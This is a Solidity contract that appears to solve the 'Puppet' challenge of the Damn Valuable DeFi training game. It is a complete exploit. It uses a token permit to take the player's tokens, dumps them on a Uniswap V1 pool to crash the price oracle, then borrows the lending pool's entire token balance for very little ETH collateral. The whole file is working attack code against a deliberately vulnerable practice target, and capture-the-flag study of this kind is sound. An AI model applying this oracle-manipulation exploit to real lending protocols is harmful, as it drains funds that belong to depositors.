// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "hardhat/console.sol";
import "./PuppetPool.sol";
import "../DamnValuableToken.sol";

interface IUniswapV1Exchange {
    function getTokenToEthOutputPrice(uint256 eth_bought)
        external
        returns (uint256);

    function tokenToEthSwapOutput(
        uint256 eth_bought,
        uint256 max_tokens,
        uint256 deadline
    ) external returns (uint256);
}

contract HackPuppetPool {
    PuppetPool private pool;
    IUniswapV1Exchange private exchange;
    DamnValuableToken private token;

    struct permit {
        address owner;
        address spender;
        uint256 value;
        uint256 deadline;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    constructor(
        address _pool,
        address _exchange,
        address _token,
        permit memory _permit
    ) payable {
        pool = PuppetPool(_pool);
        exchange = IUniswapV1Exchange(_exchange);
        token = DamnValuableToken(_token);

        address player = msg.sender;

        // ERC-2612: Permit is a technique for metatransaction token transfers. Using permit can allow a contract
        // to use a user's tokens without the user first needing to first to send an `approve()` transaction.
        token.permit(
            _permit.owner,
            _permit.spender,
            _permit.value,
            _permit.deadline,
            _permit.v,
            _permit.r,
            _permit.s
        );
        token.transferFrom(player, address(this), token.balanceOf(player));

        // swap tokens for almost all ETH from the exchange
        uint256 tokensToSell = exchange.getTokenToEthOutputPrice(9.9 ether);
        require(
            tokensToSell < token.balanceOf(address(this)),
            "Not enough tokens"
        );
        token.approve(address(exchange), tokensToSell);
        exchange.tokenToEthSwapOutput(
            9.9 ether,
            tokensToSell,
            block.timestamp + 300
        );

        // borrow all tokens from the pool for the player
        uint256 tokensToBorrow = token.balanceOf(address(pool));
        // console.log(pool.calculateDepositRequired(tokensToBorrow)); // 19940598217946400000 = 19.94 ether
        require(
            address(this).balance >
                pool.calculateDepositRequired(tokensToBorrow),
            "Not enough ether"
        );
        pool.borrow{value: address(this).balance}(tokensToBorrow, player);

        // clean up
        token.transfer(player, token.balanceOf(address(this)));
        selfdestruct(payable(player));
    }
}
